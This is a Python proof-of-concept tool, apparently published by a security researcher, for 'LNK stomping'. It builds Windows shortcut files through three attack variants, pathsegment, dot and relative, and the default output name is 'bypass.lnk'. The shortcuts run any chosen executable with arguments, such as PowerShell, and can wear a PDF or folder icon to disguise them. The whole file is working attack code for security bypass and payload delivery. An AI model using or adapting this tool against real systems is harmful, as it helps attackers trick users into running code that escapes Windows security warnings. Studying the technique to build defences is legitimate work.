# lnk_stomping.py
# Author: Joe Desimone https://x.com/dez_

import subprocess
import argparse
import os
from datetime import datetime

import pylnk3

# Sample usage:
# pip install -r requirements.txt
# python lnk_stomping.py --executable c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe --arguments "-c calc" --icon pdf --output poc-pathsegment.lnk
# or
# python lnk_stomping.py --executable cdb.exe --arguments "-cf calc.wds -o notepad.exe" --icon folder --output poc-relative.lnk --variant relative

def segment_from_path(path):
    entry = pylnk3.PathSegmentEntry()
    entry.type = pylnk3.TYPE_FILE
    now = datetime.now()
    entry.file_size = 0
    entry.modified = now
    entry.created = now
    entry.accessed = now
    entry.short_name = path
    entry.full_name = path
    return entry

def add_args_icon(lnk, arguments, icon):
    if arguments:
        lnk.link_flags.HasArguments = True
        lnk.arguments = arguments
    if icon:
        lnk.link_flags.HasIconLocation = True
        if icon == "folder":
            lnk.icon = "%SystemRoot%\System32\SHELL32.dll"
            lnk.icon_index = 3
        elif icon == "pdf":
            lnk.icon = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"
            lnk.icon_index = 13

def generate_pathsegment(output, exe, arguments=None, icon=None):
    lnk = pylnk3.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_info = None
    levels = list(pylnk3.path_levels(exe))
    elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                pylnk3.DriveEntry(levels[0])]
    path = "\\".join(exe.split("\\")[1:])
    segment = segment_from_path(path)
    elements.append(segment)
    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements

    add_args_icon(lnk, arguments, icon)

    print(f"Writing to: {output}")
    lnk.save()

def generate_dot(output, exe, arguments=None, icon=None):
    exe += "."
    lnk = pylnk3.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_info = None
    levels = list(pylnk3.path_levels(exe))
    elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                pylnk3.DriveEntry(levels[0])]
    for level in levels[1:]:
        segment = pylnk3.PathSegmentEntry.create_for_path(level)
        elements.append(segment)            
    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements

    add_args_icon(lnk, arguments, icon)

    print(f"Writing to: {output}")
    lnk.save()

def generate_relative(output, exe, arguments=None, icon=None):
    if "\\" in exe:
        print("Only supply exe name for relative variant")
        return
    lnk = pylnk3.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_info = None
    levels = list(pylnk3.path_levels(exe))
    elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_DOCUMENTS)]
    for level in levels[1:]:
        segment = pylnk3.PathSegmentEntry.create_for_path(level)
        elements.append(segment)
    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    lnk._set_relative_path(f".\\{exe}")
    
    add_args_icon(lnk, arguments, icon)

    print(f"Writing to: {output}")
    lnk.save()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--output', help='Output link file name', default=r'bypass.lnk')
    parser.add_argument('--executable', help='Path to executable', type=str, required=True)
    parser.add_argument('--arguments', help='Arguments to executable', type=str)
    parser.add_argument('--icon', help='Icon to use', choices=['folder', 'pdf'])
    parser.add_argument('--variant', help='Attack variant to use', choices=['pathsegment', 'dot', 'relative'], default='pathsegment')
    args = parser.parse_args()

    if args.variant == "pathsegment":
        generate_pathsegment(args.output, args.executable, args.arguments, args.icon)
    elif args.variant == "dot":
        generate_dot(args.output, args.executable, args.arguments, args.icon)
    elif args.variant == "relative":
        generate_relative(args.output, args.executable, args.arguments, args.icon)

if __name__ == "__main__":
    main()
